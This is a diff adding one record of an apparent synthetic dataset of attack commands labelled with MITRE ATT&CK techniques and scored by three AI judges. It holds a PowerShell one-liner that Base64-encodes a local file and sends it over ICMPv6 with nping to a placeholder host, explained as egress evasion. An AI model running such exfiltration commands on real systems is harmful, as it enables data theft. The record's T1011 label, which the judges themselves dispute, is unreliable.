@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
+  "explanation": "Exfiltrates file content over ICMP on IPv6 using Nmap's nping, avoiding typical TCP/HTTP egress. The payload is Base64-encoded to make it less obvious in casual inspection, aligning with T1011 by using a different network medium (ICMP/IPv6) than standard channels.",
+  "rationale_steps": [
+    "Read sensitive file and Base64-encode it for payload transport.",
+    "Send a single ICMPv6 Echo with the encoded data as payload to a non-standard destination."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-c8f5e0c7",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell sets a variable via .NET calls and then runs nping.exe with valid flags, balanced quotes, and proper semicolon separation.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly exfiltrates data via ICMPv6 for small payloads, but this is network-based exfiltration and not aligned with T1011's Exfiltration Over Physical Medium, with additional practical limits from command-line and ICMP payload sizes.",
+        "combined_score": 3.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T07:25:18.255318Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignment, correct method calls, and valid PowerShell syntax for converting a file to Base64 and passing it to nping with appropriate parameters.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration, it doesn't align with T1011 (Exfiltration Over Physical Medium) but rather with T1048 (Exfiltration Over Alternative Protocol) as it uses ICMP/IPv6 network communication rather than physical media.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:25:21.329700Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax for variable assignment, .NET method calls, command separation, and `nping` arguments.",
+        "semantic_score": 2,
+        "semantic_justification": "The command attempts network exfiltration via ICMP, which is misaligned with T1011 (Exfiltration Over Physical Medium) and instead aligns with T1048 (Exfiltration Over Other Network Medium); furthermore, `nping.exe` often requires elevated privileges on Windows for raw socket operations, contradicting the 'Privilege: None' claim.",
+        "combined_score": 3.5,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T07:25:36.390244Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
